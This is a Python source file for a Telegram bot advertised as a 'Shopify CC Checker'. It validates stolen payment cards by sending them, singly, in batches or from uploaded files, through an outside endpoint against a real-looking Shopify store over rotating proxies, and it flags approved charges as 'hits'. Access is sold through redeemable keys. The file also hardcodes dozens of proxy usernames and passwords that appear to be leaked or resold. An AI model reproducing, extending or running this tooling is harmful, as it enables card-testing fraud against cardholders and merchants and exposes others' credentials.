import os
import logging
import uuid
import time
import json
import random
import httpx
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from urllib.parse import quote
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Render Dummy HTTP Server
class SimpleHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive and running!")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), SimpleHandler)
    logger.info(f"Dummy HTTP server started on port {port}")
    server.serve_forever()

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_USERNAME = "@ESCROW2929"
AUTHORIZED_ADMINS = {8785590284}
DATA_FILE = "users_data.json"

BOT_IS_STOPPED = False

PROXY_LIST = [
    "reseller3270s320237:7Grp9Gki@px052001.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px051003.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px043006.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px410701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px015601.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px490701.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px591801.pointtoserver.com:10780",
    "reseller3270s320237:7Grp9Gki@px022409.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022505.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022507.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px052001.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px051003.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043006.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px410701.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px015601.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490701.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591801.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022409.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px022408.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px173003.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px420602.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px031901.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490402.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px460101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px490401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px041201.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px041202.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px470108.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px023004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px023005.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043005.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px043004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px032004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px014004.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px032002.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px040706.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px460403.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px400501.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px380101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px013301.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px019603.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px520401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px014236.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px013304.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
    "purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
    "naveed:Qwerty_123ABC@196.244.48.124:12345",
    "harishankarchoubey:HvCjWdoIrK6szj8v@136.179.19.164:3128",
    "naveed:Qwerty_123ABC@196.244.48.26:12345",
    "llewellynashleybowen:rNXaRJfNPN233zw@136.179.19.164:3128",
    "naveed:Qwerty_123ABC@196.244.48.126:12345",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ca-tor.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@im-bal.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-syd.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@jp-tok.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@sg-sin.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@it-mil.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-mel.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@id-jak.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-bri.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@nz-auc.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@pl-tor.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@th-ban.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fr-par.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ph-man.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@dk-cop.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@kr-seo.pvdata.host:8080",
    "purevpn0s12153504:1LTpwxbCJbEdXo@px460403.pointtoserver.com:10780",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@se-sto.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@fi-esp.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@au-per.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hu-bud.pvdata.host:8080",
    "3700900107896:ratchaburi79@202.41.171.9:2086",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ee-tal.pvdata.host:8080",
    "s6402011520288:surikan123@202.28.17.8:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ie-dub.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@il-tel.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@hk-hon.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@md-chi.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@ro-buk.pvdata.host:8080",
    "g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2@lt-sia.pvdata.host:8080"
]

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data = json.load(f)
                return (
                    set(data.get("all_users", [])),
                    set(data.get("banned_users", [])),
                    set(data.get("sub_admins", [])),
                    data.get("active_keys", {}),
                    {int(k): v for k, v in data.get("user_subscriptions", {}).items()}
                )
        except Exception as e:
            logger.error(f"Error loading data: {e}")
    return set(), set(), set(), {}, {}

def save_data():
    data = {
        "all_users": list(ALL_USERS),
        "banned_users": list(BANNED_USERS),
        "sub_admins": list(SUB_ADMINS),
        "active_keys": ACTIVE_KEYS,
        "user_subscriptions": USER_SUBSCRIPTIONS
    }
    try:
        with open(DATA_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

ALL_USERS, BANNED_USERS, SUB_ADMINS, ACTIVE_KEYS, USER_SUBSCRIPTIONS = load_data()

def is_main_admin(user_id):
    return user_id in AUTHORIZED_ADMINS

def is_any_admin(user_id):
    return user_id in AUTHORIZED_ADMINS or user_id in SUB_ADMINS

def parse_time_to_seconds(time_str):
    time_str = time_str.lower().strip()
    try:
        if 'd' in time_str:
            days = int(time_str.replace('d', ''))
            return days * 86400
        elif 'hour' in time_str or 'h' in time_str:
            hours = int(time_str.replace('hour', '').replace('h', '').strip())
            return hours * 3600
        elif 'm' in time_str:
            mins = int(time_str.replace('m', '').strip())
            return mins * 60
    except ValueError:
        pass
    return 86400

async def check_bot_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    global BOT_IS_STOPPED
    if BOT_IS_STOPPED:
        user_id = update.effective_user.id
        if not is_main_admin(user_id):
            await update.message.reply_text("⛔ **Bot is currently offline/stopped by the Owner!**")
            return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return
    ALL_USERS.add(user_id)
    save_data()
    user = update.effective_user
    await update.message.reply_text(
        f"Hello {user.first_name}!\n\n"
        f"🤖 Shopify CC Checker Bot is Online\n"
        f"⚠️ Use /redeem <key> to activate access.\n"
        f"👑 Owner: {OWNER_USERNAME}"
    )

async def stop_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        return
    global BOT_IS_STOPPED
    BOT_IS_STOPPED = True
    await update.message.reply_text("🛑 **BOT STOPPED SUCCESSFULLY!**")

async def start_all_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_main_admin(user_id):
        return
    global BOT_IS_STOPPED
    BOT_IS_STOPPED = False
    await update.message.reply_text("🟢 **BOT RESUMED & STARTED SUCCESSFULLY!**")

async def admin_pannel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        return
    panel_message = (
        f"🛠 Admin Panel & Controls\n\n"
        f"• Bot Status: {'🔴 Stopped' if BOT_IS_STOPPED else '🟢 Running'}\n"
        f"• Total Users: {len(ALL_USERS)}\n"
        f"• Active Keys: {len(ACTIVE_KEYS)}\n"
    )
    await update.message.reply_text(panel_message)

async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        return
    if len(context.args) < 2:
        await update.message.reply_text("❌ Usage: /key <qty> <time>")
        return
    try:
        qty = int(context.args[0])
    except ValueError:
        return
    duration_secs = parse_time_to_seconds(context.args[1])
    keys = []
    for _ in range(qty):
        k = f"PRIME-{uuid.uuid4().hex[:8].upper()}"
        ACTIVE_KEYS[k] = {"duration_seconds": duration_secs, "used_by": None, "expiry_time": None}
        keys.append(k)
    save_data()
    await update.message.reply_text(f"🔑 {qty} Keys Generated:\n" + "\n".join([f"`{x}`" for x in keys]), parse_mode="Markdown")

async def key_reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    if not is_any_admin(update.effective_user.id):
        return
    ACTIVE_KEYS.clear()
    USER_SUBSCRIPTIONS.clear()
    save_data()
    await update.message.reply_text("✅ All keys and subscriptions reset.")

async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user = update.effective_user
    if user.id in BANNED_USERS:
        return
    ALL_USERS.add(user.id)
    save_data()
    if not context.args:
        return
    k = context.args[0].strip().upper()
    if k not in ACTIVE_KEYS or ACTIVE_KEYS[k]["used_by"] is not None:
        await update.message.reply_text("❌ Invalid or used key.")
        return
    ACTIVE_KEYS[k]["used_by"] = user.id
    ACTIVE_KEYS[k]["expiry_time"] = time.time() + ACTIVE_KEYS[k]["duration_seconds"]
    USER_SUBSCRIPTIONS[user.id] = ACTIVE_KEYS[k]["expiry_time"]
    save_data()
    
    for admin_id in AUTHORIZED_ADMINS:
        try:
            await context.bot.send_message(chat_id=admin_id, text=f"🔑 Key Redeemed by {user.full_name} (`{user.id}`) using `{k}`")
        except Exception:
            pass
    await update.message.reply_text("✅ Key Successfully Redeemed!")

def has_access(user_id):
    if is_any_admin(user_id):
        return True
    if user_id in USER_SUBSCRIPTIONS:
        if time.time() < USER_SUBSCRIPTIONS[user_id]:
            return True
        else:
            del USER_SUBSCRIPTIONS[user_id]
            save_data()
            return False
    return False

async def get_bin_info(bin_code):
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            res = await client.get(f"https://lookup.binlist.net/{bin_code}")
            if res.status_code == 200:
                data = res.json()
                return f"{data.get('scheme', 'UNKNOWN').upper()} - {data.get('type', 'UNKNOWN').upper()}", data.get("bank", {}).get("name", "UNKNOWN").upper(), f"{data.get('country', {}).get('name', 'UNKNOWN').upper()} {data.get('country', {}).get('emoji', '')}"
    except Exception:
        pass
    return "UNKNOWN - UNKNOWN", "UNKNOWN", "UNKNOWN"

# SAFE PROCESS CARD WRAPPER TO PREVENT ANY CRASH
async def process_card_string(card_line, user_full_name):
    try:
        parts = card_line.split('|')
        if len(parts) < 4:
            return f"❌ {card_line} ➔ Invalid Format"
        
        cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
        formatted_cc = f"{cc}|{mes}|{ano}|{cvv}"
        bin_code = cc[:6]
        
        bin_info, bank_info, country_info = await get_bin_info(bin_code)
        site_url = "https://customsbyarrillc.myshopify.com"
        selected_proxy = random.choice(PROXY_LIST)
        api_url = f"http://rhaenyra.xyz/shopify?cc={quote(formatted_cc)}&url={quote(site_url)}&proxy={quote(selected_proxy)}"
        
        async with httpx.AsyncClient(timeout=120.0, follow_redirects=True) as client:
            try:
                response = await client.get(api_url)
                if response.status_code != 200:
                    return f"❌ {card_line} ➔ API Error Code: {response.status_code}"
                res_data = response.json()
            except Exception as e:
                return f"❌ {card_line} ➔ Gateway Timeout or Network Error."
        
        resp_status = res_data.get("Response", "UNKNOWN")
        price = res_data.get("Price", "$14.97")
        gate = res_data.get("Gate", "Shopify Payments")
        approved = str(res_data.get("Approved", "False"))
        charged = str(res_data.get("Charged", "False"))
        
        is_success = (approved.lower() == "true" or charged.lower() == "true" or "approved" in resp_status.lower() or "success" in resp_status.lower())
        hit_title = "⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!" if is_success else "❌💠 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝!"
        
        return (
            f"⚡💳  # PRIME CHECKER  💳⚡\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{hit_title}\n"
            f"⚠️ Status: {resp_status}\n"
            f"💳 Card: {formatted_cc}\n"
            f"🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gate} | 💰 {price}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"𝗕𝗜𝗡: {bin_info} | 𝗕𝗮𝗻𝗸: {bank_info}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_info}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"👤 Checked By ➠ {user_full_name}"
        )
    except Exception as err:
        logger.error(f"Error caught safely for line {card_line}: {str(err)}")
        return f"❌ {card_line} ➔ Skipped due to internal parsing exception."

card_semaphore = asyncio.Semaphore(2)

async def safe_process_card(card_line, user_full_name):
    async with card_semaphore:
        try:
            return await process_card_string(card_line, user_full_name)
        except Exception as e:
            return f"❌ {card_line} ➔ Error: {str(e)}"

async def chk_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        return
    if not context.args:
        await update.message.reply_text("❌ Usage: /chk CC|MM|YY|CVV")
        return
    msg = await update.message.reply_text("⏳ Processing card...")
    result = await process_card_string(" ".join(context.args), update.effective_user.first_name)
    await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=msg.message_id, text=result)

async def chks_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        return
    
    cards_text = update.message.text.replace("/chks", "").strip()
    if not cards_text:
        return
    card_lines = [l.strip() for l in cards_text.split("\n") if l.strip() and "|" in l][:10]
    if not card_lines:
        return

    status_msg = await update.message.reply_text(f"⏳ Processing {len(card_lines)} cards safely...")
    tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    final_output = "\n\n".join([str(r) for r in results])
    if len(final_output) > 4000:
        final_output = final_output[:4000] + "\n\n[Truncated]"
    
    try:
        await context.bot.edit_message_text(chat_id=update.effective_chat.id, message_id=status_msg.message_id, text=final_output)
    except Exception:
        await update.message.reply_text(final_output)

async def chf_file_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_bot_status(update, context):
        return
    user_id = update.effective_user.id
    if user_id in BANNED_USERS or not has_access(user_id):
        return
    document = update.message.document
    if not document:
        return
    
    status_msg = await update.message.reply_text("⏳ Processing file...")
    try:
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()
        card_lines = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").split("\n") if l.strip() and "|" in l][:10]
        
        tasks = [safe_process_card(line, update.effective_user.first_name) for line in card_lines]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        final_output = "\n\n".join([str(r) for r in results])[:4000]
        await context.bot.send_message(chat_id=update.effective_chat.id, text=final_output)
    except Exception as e:
        logger.error(f"File error: {e}")

def main():
    if not TOKEN:
        return
    threading.Thread(target=run_server, daemon=True).start()
    app = ApplicationBuilder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_bot))
    app.add_handler(CommandHandler("startall", start_all_bot))
    app.add_handler(CommandHandler("admin", admin_pannel))
    app.add_handler(CommandHandler("key", generate_key))
    app.add_handler(CommandHandler("keyreset", key_reset_command))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(CommandHandler("chk", chk_card))
    app.add_handler(CommandHandler("chks", chks_cards))
    app.add_handler(CommandHandler("chf", chf_file_check))
    app.add_handler(MessageHandler(filters.Document.ALL, chf_file_check))
    
    app.run_polling()

if __name__ == "__main__":
    main()
